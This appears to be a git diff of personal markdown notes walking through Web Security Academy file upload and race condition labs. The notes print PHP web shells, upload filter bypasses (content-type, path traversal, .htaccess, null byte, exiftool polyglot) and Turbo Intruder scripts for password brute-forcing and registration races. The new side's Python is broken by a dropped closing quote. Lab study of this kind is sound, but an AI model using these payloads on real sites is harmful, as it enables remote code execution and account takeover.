@@ -956,54 +956,54 @@
 - use an established framework for preprocessing file uploads      
 
 ### File Upload Lab
-- Remote code execution via **web shell upload**
-  - upload image
-    POST /my-account/avatar
-    **Content-Disposition: form-data; name="avatar"; filename="profile.png"**
-    **Content-Type: image/png **  
-    Content-Disposition: form-data; name="user"
-    Content-Disposition: form-data; name="csrf"
-  - Upload **exploit.php**
-    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
-  - GET /files/avatars/exploit.php   > secret code
-- Web shell upload via **Content-Type** restriction bypass
-  - Error: file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed
-  - POST /my-account/avatar   
-    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJEBayCEruOgolfHL   
-    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
-  - Change the content-type to `Content-Type:image/jpeg`
-- Web shell upload via **path traversal**
-  - The server has just returned the contents of the PHP file as plain text.
-  - In the Content-Disposition header, change the filename to include a directory traversal sequence
-    Content-Disposition: form-data; name="avatar"; filename="**../**exploit.php"   
-    Response: The file avatars/exploit.php has been uploaded.
-  - Obfuscate the directory traversal sequence by URL encoding the forward slash (/)
-    Content-Disposition: form-data; name="avatar"; filename="`..%2f`exploit.php"   
-    Response: The file avatars/../exploit.php has been uploaded.   
-  - Browse the file, Uploaded as /files/avatars/..%2fexploit.php   
-    https://0aa000c804f4e4a281500c7b002200b4.web-security-academy.net/files/avatars/**exploit.php**
-- Web shell upload via **extension blacklist bypass**
-  - Change the requests for filename and content-type parameter
-    Content-Disposition: form-data; name="avatar"; **filename=".htaccess"**
-    **Content-Type: text/plain**   
-    `AddType application/x-httpd-php .l33t`   
-    Response: The file avatars/.htaccess has been uploaded.   
-  - Content-Disposition: form-data; name="avatar"; **filename="exploit.l33t"**   
-    Content-Type: image/jpeg   
-    Response: The file avatars/exploit.l33t has been uploaded.   
-  - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
-- Web shell upload via **obfuscated file extension**
-  - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
-- Remote code execution via polyglot **web shell upload**
-  - Install [exiftool](https://exiftool.org/install.html)   
-    Add system environment variables path -> C:\exiftool-12.89_32  > rename to "exiftool.exe" > add a profile.png image into the folder
-  - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" profile.png -o polyglot.php`
-  - browse the uploaded file >  PNG  IHDR{  * dStEXtCommentSTART **thIqb3Mm93Qqs0jr8Cl2kEv2E7r3xDp1** ENDԴ`PA I
-- Web shell upload via **race condition (Expert)**
-  - The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed
-  - Send repeater for POST /my-account/avatar & GET /files/avatars/exploit.php request   
-  - in POST request > **add tab to group > create new group** > add GET request   
-  - **send group in parallel**    
+1. Remote code execution via **web shell upload**
+   - upload image
+     POST /my-account/avatar
+     **Content-Disposition: form-data; name="avatar"; filename="profile.png"**
+     **Content-Type: image/png **  
+     Content-Disposition: form-data; name="user"
+     Content-Disposition: form-data; name="csrf"
+   - Upload **exploit.php**
+     `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+   - GET /files/avatars/exploit.php   > secret code
+2. Web shell upload via **Content-Type** restriction bypass
+   - Error: file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed
+   - POST /my-account/avatar   
+     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJEBayCEruOgolfHL   
+     Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+   - Change the content-type to `Content-Type:image/jpeg`
+3. Web shell upload via **path traversal**
+   - The server has just returned the contents of the PHP file as plain text.
+   - In the Content-Disposition header, change the filename to include a directory traversal sequence
+     Content-Disposition: form-data; name="avatar"; filename="**../**exploit.php"   
+     Response: The file avatars/exploit.php has been uploaded.
+   - Obfuscate the directory traversal sequence by URL encoding the forward slash (/)
+     Content-Disposition: form-data; name="avatar"; filename="`..%2f`exploit.php"   
+     Response: The file avatars/../exploit.php has been uploaded.   
+   - Browse the file, Uploaded as /files/avatars/..%2fexploit.php   
+     https://0aa000c804f4e4a281500c7b002200b4.web-security-academy.net/files/avatars/**exploit.php**
+4. Web shell upload via **extension blacklist bypass**
+   - Change the requests for filename and content-type parameter
+     Content-Disposition: form-data; name="avatar"; **filename=".htaccess"**
+     **Content-Type: text/plain**   
+     `AddType application/x-httpd-php .l33t`   
+     Response: The file avatars/.htaccess has been uploaded.   
+   - Content-Disposition: form-data; name="avatar"; **filename="exploit.l33t"**   
+     Content-Type: image/jpeg   
+     Response: The file avatars/exploit.l33t has been uploaded.   
+   - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
+5. Web shell upload via **obfuscated file extension**
+   - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
+6. Remote code execution via polyglot **web shell upload**
+   - Install [exiftool](https://exiftool.org/install.html)   
+     Add system environment variables path -> C:\exiftool-12.89_32  > rename to "exiftool.exe" > add a profile.png image into the folder
+   - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" profile.png -o polyglot.php`
+   - browse the uploaded file >  PNG  IHDR{  * dStEXtCommentSTART **thIqb3Mm93Qqs0jr8Cl2kEv2E7r3xDp1** ENDԴ`PA I
+7. Web shell upload via **race condition (Expert)**
+   - The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed
+   - Send repeater for POST /my-account/avatar & GET /files/avatars/exploit.php request   
+   - in POST request > **add tab to group > create new group** > add GET request   
+   - **send group in parallel**    
 
 ## Race Condition
 Read up: [Smashing the state machine: The true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)   
@@ -1032,97 +1032,97 @@ Read up: [Smashing the state machine: The true potential of web race conditions]
 - Avoid server-side state entirely. Store state in a JWT and ensure it's encrypted and signed to prevent tampering. 
 
 ### Race Condition Lab
-- Limit overrun race conditions
-  - For 20% off use code at checkout: **PROMO20**
-  - Apply coupon code, intercept > send to repeater: POST /cart/coupon
-  - Create 20 duplicate tabs (Ctrl+R)
-  - **Create a new group > add tabs to group > check the 20 repeaters box**
-  - Send group in paralle (single-packet attack)   
-- Bypassing rate limits via race conditions
-  - POST /login HTTP/1.1   
-    csrf=V3z6oyspnjRPU9Dow4w6Dx96MpCeHVTT&username=carlos&password=`%s`   
-  - Right click request > extension > turbo intruder > **send to turbo intruder** > select select examples/race-single-packet-attack.py   
-  - Amend the python code in below   
-    ```Python
-    def queueRequests(target, wordlists):
+1. Limit overrun race conditions
+   - For 20% off use code at checkout: **PROMO20**
+   - Apply coupon code, intercept > send to repeater: POST /cart/coupon
+   - Create 20 duplicate tabs (Ctrl+R)
+   - **Create a new group > add tabs to group > check the 20 repeaters box**
+   - Send group in paralle (single-packet attack)   
+2. Bypassing rate limits via race conditions
+   - POST /login HTTP/1.1   
+     csrf=V3z6oyspnjRPU9Dow4w6Dx96MpCeHVTT&username=carlos&password=`%s`   
+   - Right click request > extension > turbo intruder > **send to turbo intruder** > select select examples/race-single-packet-attack.py   
+   - Amend the python code in below   
+     ```Python
+     def queueRequests(target, wordlists):
 
-    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
-    engine = RequestEngine(endpoint=target.endpoint,
+     # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
     
-    # assign the list of candidate passwords from your clipboard
-    passwords = wordlists.clipboard
+     # assign the list of candidate passwords from your clipboard
+     passwords = wordlists.clipboard
     
-    # queue a login request using each password from the wordlist
-    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
-    for password in passwords:
-        engine.queue(target.req, password, gate='1')
+     # queue a login request using each password from the wordlist
+     # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+     for password in passwords:
+         engine.queue(target.req, password, gate='1')
     
-    # once every request has been queued
-    # invoke engine.openGate() to send all requests in the given gate simultaneously
-    engine.openGate('1')
+     # once every request has been queued
+     # invoke engine.openGate() to send all requests in the given gate simultaneously
+     engine.openGate('1')
 
-    def handleResponse(req, interesting):   
-    table.add(req)   
-    ```
-    - start attack > observe 302 response code   
-- Multi-endpoint race conditions
-  - create tab group
-    - **add gift card**: POST /cart productId=2&redir=PRODUCT&quantity=1
-    - **check out**: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
-    - **add jacket**: POST /cart productId=1&redir=PRODUCT&quantity=1
-  - under check out tab > send group (parallel)
-- Single-endpoint race conditions   
-  - **POST /my-account/change-email**   
-    - request 1: anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net   
-    - request 2: carlos@ginandjuice.shop   
-  - send the requests in parallel   
-  - Receive email of carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.   
-- Partial construction race conditions
-  - **POST /register**   
-    csrf=CRs0ranHwII63CbQnp32ZGxCEKavBZcO&username=`%s`&email=user%40ginandjuice.shop&password=123456
-  - **send to turbbo intruder**
-    ```python
-    def queueRequests(target, wordlists):
+     def handleResponse(req, interesting):   
+     table.add(req)   
+     ```
+     - start attack > observe 302 response code   
+3. **Multi-endpoint** race conditions
+   - create tab group
+     - **add gift card**: POST /cart productId=2&redir=PRODUCT&quantity=1
+     - **check out**: POST /cart/checkout csrf=x6iduAm1T1W4PglGBhWRD94NTLa0W4jk
+     - **add jacket**: POST /cart productId=1&redir=PRODUCT&quantity=1
+   - under check out tab > send group (parallel)
+4. Single-endpoint race conditions   
+   - **POST /my-account/change-email**   
+     - request 1: anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net   
+     - request 2: carlos@ginandjuice.shop   
+   - send the requests in parallel   
+   - Receive email of carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.   
+5. Partial construction race conditions
+   - **POST /register**   
+     csrf=CRs0ranHwII63CbQnp32ZGxCEKavBZcO&username=`%s`&email=user%40ginandjuice.shop&password=123456
+   - **send to turbbo intruder**
+     ```python
+     def queueRequests(target, wordlists):
 
-    engine = RequestEngine(endpoint=target.endpoint,
+     engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2
                             )
     
-    confirmationReq = '''POST /confirm?token[]= HTTP/2
-    Host: 0ac7000204681544819facc200310057.web-security-academy.net
-    Cookie: phpsessionid=NzQYwl5AGYNLGU50kB1QxFMfV54fXskz
-    Content-Length: 0
-    '''  
-    for attempt in range(20):
-        currentAttempt = str(attempt)
-        username = 'hacks' + currentAttempt
+     confirmationReq = '''POST /confirm?token[]= HTTP/2
+     Host: 0ac7000204681544819facc200310057.web-security-academy.net
+     Cookie: phpsessionid=NzQYwl5AGYNLGU50kB1QxFMfV54fXskz
+     Content-Length: 0
+       
+     for attempt in range(20):
+         currentAttempt = str(attempt)
+         username = 'hacks' + currentAttempt
     
-        # queue a single registration request
-        engine.queue(target.req, username, gate=currentAttempt)
+         # queue a single registration request
+         engine.queue(target.req, username, gate=currentAttempt)
         
-        # queue 50 confirmation requests - note that this will probably sent in two separate packets
-        for i in range(50):
-            engine.queue(confirmationReq, gate=currentAttempt)
+         # queue 50 confirmation requests - note that this will probably sent in two separate packets
+         for i in range(50):
+             engine.queue(confirmationReq, gate=currentAttempt)
         
-        # send all the queued requests for this attempt
-        engine.openGate(currentAttempt)
+         # send all the queued requests for this attempt
+         engine.openGate(currentAttempt)
 
-    def handleResponse(req, interesting):
-       table.add(req)
+     def handleResponse(req, interesting):
+        table.add(req)
 
-    username=User0&email=user%40ginandjuice.shop&password=123456
-    ```
-- Exploiting time-sensitive vulnerabilities
-  - GET /forgot-password > repeater > remove the session cookie
-  - From the response， grab the cookie and csrf token. Paste to 2nd request  
-  - request 1: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=wiener   
-  - request 2: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=carlos   
-  - send requests in paralle (check miliseconds)   
-  - Email retrieve the same toke same as carlos https://0a6900f80434cae2813702630092000a.web-security-academy.net/forgot-password?**user=carlos**&**token=fb72ceec9631530954d3e0dc2077c72fbbe7d981**
+     username=User0&email=user%40ginandjuice.shop&password=123456
+     ```
+7. Exploiting time-sensitive vulnerabilities
+   - GET /forgot-password > repeater > remove the session cookie
+   - From the response， grab the cookie and csrf token. Paste to 2nd request  
+   - request 1: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=wiener   
+   - request 2: POST /forgot-password csrf=qkTrYHsMf4bkS7bfcve9Pkkk9xdDOJd9&username=carlos   
+   - send requests in paralle (check miliseconds)   
+   - Email retrieve the same toke same as carlos https://0a6900f80434cae2813702630092000a.web-security-academy.net/forgot-password?**user=carlos**&**token=fb72ceec9631530954d3e0dc2077c72fbbe7d981**
 
 ## SSRF (Server-Side Request Forgery)
 **SSRF impacts**
